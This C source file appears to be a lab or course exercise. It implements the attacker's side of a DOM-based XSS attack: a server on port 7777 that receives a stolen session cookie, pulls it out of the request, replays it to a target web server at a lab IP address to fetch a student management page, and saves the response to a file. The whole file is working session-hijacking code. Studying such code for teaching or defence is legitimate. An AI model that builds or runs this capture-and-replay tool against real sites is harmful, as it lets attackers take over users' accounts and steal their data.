/*
 * ex3_dom.c
 * 
 * DOM-based XSS Attack Demonstration - Attacker's Server
 * 
 * This program implements a simple HTTP server that listens on port 7777
 * and captures one HTTP GET request containing stolen session cookies from
 * a DOM-based XSS attack. It logs the entire request to spoofed-dom.txt
 * for analysis.
 * 
 * Compilation: gcc -Wall -Wextra -Werror -Wconversion ex3_dom.c -o ex3_dom
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define WEB_IP "192.168.1.203"
#define WEB_PORT 80
#define PORT 7777
#define BUFFER_SIZE 8192
#define OUTPUT_FILE "spoofed-dom.txt"

/*
 * SET UP SERVERS SOCKET
 * RETURN FD
 */
static int setup_server_socket(void)
{
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    perror("socket");
    exit(EXIT_FAILURE);
  }

  int opt = 1;
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,
                 &opt, (socklen_t)sizeof(opt)) < 0) {
    perror("setsockopt SO_REUSEADDR");
    close(fd);
    exit(EXIT_FAILURE);
  }

  if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT,
                 &opt, (socklen_t)sizeof(opt)) < 0) {
    perror("setsockopt SO_REUSEPORT");
    close(fd);
    exit(EXIT_FAILURE);
  }

  return fd;
}
/*
 * extract_cookie- Extracts only the cookie value from HTTP request
 * @request: The raw HTTP request string
 * @sessid_out: Output buffer to store the extracted cookie
 * @out_size: Size of the output buffer
 *
 * Searches for cookie in the Cookie header or URL parameters and
 * extracts only its value without any prefix.
 *
 * Returns: 1 on success, 0 if cookie not found or error
 */
static int extract_cookie(const char *request,
                          char *cookie_out,
                          size_t out_size)
{
  const char *cookie_start = strstr(request, "cookie=");
  if (cookie_start == NULL) {
    return 0;
  }

  cookie_start += strlen("cookie=");

  /* expect cookie=....*/

  const char *end = cookie_start;
  while (*end != ' ' &&
         *end != '\r' &&
         *end != '\n')
  {
    end++;
  }

  size_t len = (size_t)(end - cookie_start);
  if (len == 0 || len >= out_size)
    return 0;

  memcpy(cookie_out, cookie_start, len);
  cookie_out[len] = '\0';
  return 1;
}
/*
 * SERVER BIND AND LISTEN
 */
static int bind_and_listen(int server_fd, struct sockaddr_in *server_addr)
{
  server_addr->sin_family = AF_INET;
  server_addr->sin_addr.s_addr = INADDR_ANY;
  server_addr->sin_port = htons(PORT);

  if (bind(server_fd, (struct sockaddr *)server_addr, sizeof(*server_addr))
      < 0) {
    return 0;
  }

  if (listen(server_fd, 1) < 0) {
    return 0;
  }
  return 1;
}


/*
 * RECV RESPONSE FROM WEB SERVER AND WRITES TO FILE
 * 0-fail
 * 1-success
 */
static int recv_response_from_web(int web_fd){
  FILE * output_file = fopen(OUTPUT_FILE, "w");
  if (!output_file) {
    return 0;
  }
  char response_from_web[BUFFER_SIZE];
  memset(response_from_web,0,BUFFER_SIZE);
  int recv_flg=0;
  ssize_t recv_len;
  while((recv_len = read(web_fd, response_from_web, BUFFER_SIZE - 1))>0){
    fwrite(response_from_web,1,(size_t)recv_len,output_file);
    memset(response_from_web,0,BUFFER_SIZE);
    recv_flg=1;
  }
  fclose(output_file);
  return recv_flg;
}

/*
 * SEND REQUEST
 * 0-fail
 * 1-success
 *
 */
static int send_request_to_web(const char *cookie_id)
{
  int web_fd = socket (AF_INET, SOCK_STREAM, 0);
  if (web_fd < 0) {
    return 0;
  }

  struct sockaddr_in web_addr;
  web_addr.sin_family = AF_INET;
  web_addr.sin_port = htons (WEB_PORT);

  if (inet_pton (AF_INET, WEB_IP, &web_addr.sin_addr) <= 0){
    close (web_fd);
    return 0;
  }

  if (connect (web_fd, (struct sockaddr *) &web_addr, sizeof (web_addr)) < 0){
    close(web_fd);
    return 0;
  }

  char request[BUFFER_SIZE];
  int len = snprintf (request, sizeof (request),
                      "GET /studentManagerDOMBASED.php HTTP/1.1\r\n"
                      "Host: %s\r\n"
                      "Cookie: %s\r\n"
                      "Connection: close\r\n"
                      "\r\n",
                      WEB_IP, cookie_id);

  if (len <= 0 || len >= BUFFER_SIZE){
    close(web_fd);
    return 0;
  }

  if (send (web_fd, request, strlen(request), 0) < 0){
    close(web_fd);
    return 0;
  }

  if (recv_response_from_web (web_fd) != 1){
    close (web_fd);
    return 0;
  }
  close(web_fd);
  return 1;
}

/*
 * ACCEPT CLIENT
 */
static int accept_addr(int server_fd, struct sockaddr_in *addr){
  socklen_t  addr_len = sizeof(addr);
  int accept_fd = accept(server_fd, (struct sockaddr *)addr,
                         &addr_len);
  return accept_fd;
}

int main(void) {

    // SET UP SERVER SOCKET
    int server_fd = -1;
    server_fd = setup_server_socket();
    if (server_fd < 0)
    {
      close(server_fd);
      exit(EXIT_FAILURE);
    }
    // BIND AND LISTEN
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    int bind_n_listen = bind_and_listen(server_fd, &addr);
    if (bind_n_listen!=1){
      printf("closed bind and listen");
      close(server_fd);
      exit(EXIT_FAILURE);
    }

    printf("Attacker's server listening on port %d...\n", PORT);
    printf("Waiting for stolen cookies from DOM-based XSS attack...\n");

    // ACCEPT CLIENT
    int accept_fd = -1;
    accept_fd = accept_addr(server_fd, &addr);
    if (accept_fd < 0){
      close(server_fd);
      exit(EXIT_FAILURE);
    }

    // HANDLE CLIENT - to browse the target URL
    char buffer[BUFFER_SIZE];
    // READ CLIENT
    ssize_t bytes_read;
    memset(buffer, 0, BUFFER_SIZE);
    bytes_read = read(accept_fd, buffer, BUFFER_SIZE - 1);
    if (bytes_read < 0) {
      close(accept_fd);
      close(server_fd);
      exit(EXIT_FAILURE);
    }
    buffer[bytes_read] = '\0';

  // EXTRACT COOKIE FROM STOLEN COOKIE
  char cookie[BUFFER_SIZE];
  memset(cookie, 0, sizeof(cookie));
  if (!extract_cookie(buffer, cookie, sizeof(cookie))) {
    close(accept_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // SEND REQUEST TO WEB AND SAVE RESPONSE TO OUT FILE
  if (send_request_to_web(cookie)!=1){

    close(accept_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // TERMINATE
  close(accept_fd);
  close(server_fd);
  exit (EXIT_SUCCESS);

    return 0;
}
